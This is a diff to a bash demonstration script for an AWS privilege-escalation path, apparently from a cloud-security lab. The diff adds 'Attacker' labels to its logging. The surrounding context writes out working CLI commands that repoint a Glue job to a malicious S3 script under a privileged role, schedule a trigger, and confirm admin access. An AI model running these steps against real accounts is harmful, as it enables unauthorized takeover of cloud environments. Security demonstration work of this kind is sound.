@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -92,7 +94,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -104,7 +106,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -112,7 +114,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -166,7 +168,7 @@ echo -e "${YELLOW}Step 7: Showing current job configuration${NC}"
 echo "Retrieving current configuration of job: $GLUE_JOB_NAME"
 echo ""
 
-show_cmd "aws glue get-job --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --output json"
+show_cmd "Attacker" "aws glue get-job --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --output json"
 JOB_CONFIG=$(aws glue get-job \
     --region $AWS_REGION \
     --job-name "$GLUE_JOB_NAME" \
@@ -190,7 +192,7 @@ echo "New script: $MALICIOUS_SCRIPT_S3_PATH"
 
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 
-show_attack_cmd "aws glue update-job --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --job-update \"Role=${TARGET_ROLE_ARN},Command={Name=pythonshell,ScriptLocation=${MALICIOUS_SCRIPT_S3_PATH},PythonVersion=3.9}\" --output json"
+show_attack_cmd "Attacker" "aws glue update-job --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --job-update \"Role=${TARGET_ROLE_ARN},Command={Name=pythonshell,ScriptLocation=${MALICIOUS_SCRIPT_S3_PATH},PythonVersion=3.9}\" --output json"
 aws glue update-job \
     --region $AWS_REGION \
     --job-name "$GLUE_JOB_NAME" \
@@ -212,7 +214,7 @@ echo -e "${YELLOW}Step 9: Creating trigger that starts immediately${NC}"
 echo "Trigger name: $TRIGGER_NAME"
 echo "Using scheduled trigger with --start-on-creation flag..."
 
-show_attack_cmd "aws glue create-trigger --region $AWS_REGION --name \"$TRIGGER_NAME\" --type SCHEDULED --start-on-creation --schedule \"cron(0/1 * * * ? *)\" --actions '[{\"JobName\": \"'$GLUE_JOB_NAME'\"}]' --output json"
+show_attack_cmd "Attacker" "aws glue create-trigger --region $AWS_REGION --name \"$TRIGGER_NAME\" --type SCHEDULED --start-on-creation --schedule \"cron(0/1 * * * ? *)\" --actions '[{\"JobName\": \"'$GLUE_JOB_NAME'\"}]' --output json"
 aws glue create-trigger \
     --region $AWS_REGION \
     --name "$TRIGGER_NAME" \
@@ -239,7 +241,7 @@ echo ""
 
 # Check trigger state
 echo "Verifying trigger state..."
-show_cmd "aws glue get-trigger --region $AWS_REGION --name \"$TRIGGER_NAME\" --query 'Trigger.State' --output text"
+show_cmd "Attacker" "aws glue get-trigger --region $AWS_REGION --name \"$TRIGGER_NAME\" --query 'Trigger.State' --output text"
 TRIGGER_STATE=$(aws glue get-trigger \
     --region $AWS_REGION \
     --name "$TRIGGER_NAME" \
@@ -326,7 +328,7 @@ echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
